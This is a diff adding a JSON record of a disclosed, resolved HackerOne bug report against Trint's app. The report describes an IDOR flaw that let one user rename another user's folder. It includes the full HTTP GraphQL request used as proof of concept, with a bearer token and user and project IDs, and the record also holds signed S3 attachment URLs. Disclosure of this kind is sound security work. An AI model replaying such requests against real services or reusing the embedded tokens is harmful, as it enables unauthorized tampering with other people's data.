@@ -1,0 +1,157 @@
+{
+  "id": 587687,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81ODc2ODc=",
+  "url": "https://hackerone.com/reports/587687",
+  "title": "IDOR to update folder name of other user",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2019-05-22T08:16:42.265Z",
+  "submitted_at": "2019-05-22T08:16:42.265Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "toannc123",
+    "url": "/toannc123",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/sp2zgbGsuKoqa4Pa4HsjxumR/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 21749,
+    "url": "https://hackerone.com/trint",
+    "handle": "trint",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/qqW6sCzyN86bfWnrnhRpaLYD/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/qqW6sCzyN86bfWnrnhRpaLYD/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Trint Ltd",
+      "twitter_handle": "TrintHQ",
+      "website": "http://www.trint.com",
+      "about": "Trint’s AI audio transcription software makes any audio and video searchable, editable and shareable."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-07-03T11:30:45.848Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-06-03T11:30:45.221Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "###Summary\nThere is an IDOR to update folder name of other user\n\n###Steps To Reproduce:\n\n- user A login to the application and see the folder name\n\n{F494331}\n\n\n- user B login to the application and call the API with the **projectId** of user A\n\n```\nPOST / HTTP/1.1\nHost: graphql2.trint.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://app.trint.com/trints\ncontent-type: application/json\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vaXNOZXdVc2VyIjp0cnVlLCJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWNlNTAyYTIxZTFjYWY3NTBkNmM3ZjU5IiwiaXNzIjoiaHR0cHM6Ly90cmludC5hdXRoMC5jb20vIiwic3ViIjoiZmFjZWJvb2t8NTM5NjM3MDE2NTY4MjUxIiwiYXVkIjoiaWNoNGh5VllQS0tnZUVvVGg2ZldQWGM2ZnJ2ZVRjVHEiLCJpYXQiOjE1NTg1MTIyOTYsImV4cCI6MTU2MDg3Mjg4MH0.umWI5RJnC3bO1NbP5TFI0A37H182U7J0WC3d_5W0xLc\nX-Trint-Request-Id: 53c6c888-89a3-402b-b6f5-2dedc3f69aa8\nX-Trint-Super-Properties: {\"distinct_id\":\"5ce502a21e1caf750d6c7f59\",\"$device_id\":\"16ade919a91481-044fc792d93be1-4c312272-1fa400-16ade919a9274\",\"$initial_referrer\":\"$direct\",\"$initial_referring_domain\":\"$direct\",\"returningUser\":false,\"$user_id\":\"5ce502a21e1caf750d6c7f59\"}\nOrigin: https://app.trint.com\nContent-Length: 490\nConnection: close\n\n{\"operationName\":\"updateProject\",\"variables\":{\"userId\":\"5ce502a21e1caf750d6c7f59\",\"projectName\":\"abctesthorizontal\",\"projectId\":\"i2lu5qZVTwWnQQhPp_g8Ig\"},\"query\":\"mutation updateProject($userId: String!, $projectName: String!, $projectId: String!) {\\n  updateProject(userId: $userId, projectName: $projectName, projectId: $projectId) {\\n    ...RenameProjectFragment\\n    __typename\\n  }\\n}\\n\\nfragment RenameProjectFragment on Project {\\n  _id\\n  projectName\\n  updated\\n  __typename\\n}\\n\"}\n```\n\n{F494332}\n\n\n- After that, the folder name of user A is changed\n\n{F494333}\n\n## Impact\n\nAn attacker could update folder name of other user.",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 494331,
+      "file_name": "Capture1.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/494/331/8b9ba3db6dd4d1764c8b6be5b62823190244393e/Capture1.PNG?response-content-disposition=attachment%3B%20filename%3D%22Capture1.PNG%22%3B%20filename%2A%3DUTF-8%27%27Capture1.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132300Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1b56d831326f6f604588a824fd2e485e184ad10bb8a099e8df7e2bec354fd080",
+      "file_size": 35371,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 494332,
+      "file_name": "Capture2.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/494/332/b7cd203aa1f18f28c36cb682d744fae71faa87b8/Capture2.PNG?response-content-disposition=attachment%3B%20filename%3D%22Capture2.PNG%22%3B%20filename%2A%3DUTF-8%27%27Capture2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132300Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=86a7ba40d92ce277a8bc52c1267522edc9f507f0dbcf04cd19fdcb316907ee47",
+      "file_size": 76358,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 494333,
+      "file_name": "Capture3.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/494/333/fd884a16a3c7df0735cbd3c1b9a87374a1e8b42c/Capture3.PNG?response-content-disposition=attachment%3B%20filename%3D%22Capture3.PNG%22%3B%20filename%2A%3DUTF-8%27%27Capture3.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132300Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b6c8b247134e796e27954cd4ddb11751988f382d783f37ee9dc1e05f8d2078d6",
+      "file_size": 34260,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-07-03T11:30:45.303Z",
+  "allow_singular_disclosure_after": -145677135.40175337,
+  "singular_disclosure_allowed": true,
+  "vote_count": 19,
+  "voters": [
+    "imranhudaa",
+    "ali",
+    "dhakal_ananda",
+    "healdb",
+    "rashedul_css",
+    "bb00x",
+    "cryptographer",
+    "tiago-danin",
+    "b01763066cbe8d45b934cce",
+    "von001",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 22765,
+    "asset_type": "URL",
+    "asset_identifier": "app.trint.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
